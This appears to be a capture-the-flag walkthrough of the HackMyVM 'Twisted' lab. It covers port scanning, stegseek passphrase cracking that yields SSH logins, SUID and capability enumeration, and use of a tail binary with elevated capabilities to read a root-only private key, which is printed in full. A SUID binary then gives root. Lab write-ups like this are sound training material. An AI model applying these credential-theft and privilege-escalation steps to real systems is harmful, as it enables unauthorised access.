@@ -1,0 +1,185 @@
+---
+title: "Twisted - HackMyVM Walkthrough"
+---
+
+Description:
+An easy one. Tested on Vbox.
+
+nmap service scan: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/twisted]
+└─$ nmap -p- -sV 192.168.56.254
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-03 17:29 EDT
+Nmap scan report for 192.168.56.254
+Host is up (0.0015s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx 1.14.2
+2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+{% endhighlight %}
+So a web server and a ssh service running on a peculiar port of 2222. 
+
+We get a webpage with two "identical" images on it. Let's wget the images and run 
+stego tools on them to see if there's any additional information hidden in them. 
+stegseek results:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/twisted]
+└─$ stegseek cat-hidden.jpg /usr/share/wordlists/rockyou.txt 
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "sexymama"
+
+[i] Original filename: "mateo.txt".
+[i] Extracting to "cat-hidden.jpg.out".
+{% endhighlight %}
+
+from the text file we have the user name mateo and the password thisismypassword. 
+These credentials worked when logging in via SSH. 
+
+Local enumeration:
+
+note.txt:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/twisted]
+mateo@twisted:~$ cat note.txt 
+/var/www/html/gogogo.wav
+{% endhighlight %}
+
+Seeing as this wav file can be accessed in the browser, I downloaded and listened to 
+it. It's morse code. Let's run the file through a website that detects morse code in
+WAV files: https://morsecode.world/international/decoder/audio-decoder-adaptive.html
+
+
+Message from the file: 
+>G O D E E P E R . . . C O M E W I T H M E . . . L I T T L E R A B B I T . . .
+
+There are three users on the system. bonita, markus and mateo. bonita has a SUID 
+binary in the directory called `beroot`. 
+
+SGID binaries: 
+{% highlight terminal %}
+mateo@twisted:~$ find / -perm -g=s -type f 2>/dev/null 
+/home/bonita/beroot
+/usr/bin/chage
+/usr/bin/ssh-agent
+/usr/bin/wall
+/usr/bin/dotlockfile
+/usr/bin/crontab
+/usr/bin/expiry
+/usr/bin/bsd-write
+/usr/sbin/unix_chkpwd
+{% endhighlight %}
+
+SUID binaries: 
+{% highlight terminal %}
+mateo@twisted:~$ find / -perm -u=s -type f 2>/dev/null 
+/home/bonita/beroot
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+{% endhighlight %}
+
+World writeable folders: 
+{% highlight terminal %}
+mateo@twisted:~$ find / -perm -222 -type d 2>/dev/null 
+/tmp
+/tmp/.XIM-unix
+/tmp/.X11-unix
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/dev/mqueue
+/dev/shm
+/run/lock
+/var/tmp
+{% endhighlight %}
+
+Trying to bruteforce the ssh credentials of the other users failed.
+
+I overlooked running the original cat picture through stegseek. Let's do that now:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/twisted]
+└─$ stegseek cat-original.jpg /usr/share/wordlists/rockyou.txt 
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "westlife"
+
+[i] Original filename: "markus.txt".
+[i] Extracting to "cat-original.jpg.out".
+{% endhighlight %}
+
+We get the login credentials for markus: markus:markuslovesbonita
+
+Let's use them to login as markus over SSH. 
+Local enumeration:
+
+{% highlight terminal %}
+markus@twisted:~$ cat note.txt 
+Hi bonita,
+I have saved your id_rsa here: /var/cache/apt/id_rsa
+Nobody can find it.
+{% endhighlight %}
+
+Only root can read and write to the id_rsa file in that directory, so we'll need to
+find another way of escalating privileges. 
+
+After running linpeas.sh:
+{% highlight terminal %}
+Files with capabilities (limited to 50):
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/tail = cap_dac_read_search+ep
+{% endhighlight %}
+
+Using tail to read the id_rsa file:
+{% highlight terminal %}
+markus@twisted:~$ tail -n 70 /var/cache/apt/id_rsa 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
+FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
+olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
+vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
+gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
+tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
+gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
+xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
+DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
+uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
+XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
+U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
+mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
+hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
+nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
+mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
+bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
+yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
+UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
+V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
+LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
+a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
+eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
+D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+{% endhighlight %}
+
+Using RSA key to log in as bonita. 
+
+After some static analysis using radare2, I found the value of the code we needed to
+get a root shell:
+{% highlight terminal %}
+bonita@twisted:~$ ./beroot 
+Enter the code:
+ 5880
+root@twisted:~# 
+{% endhighlight %}
+
+Flags submitted and points added to score. Hooray for points. 
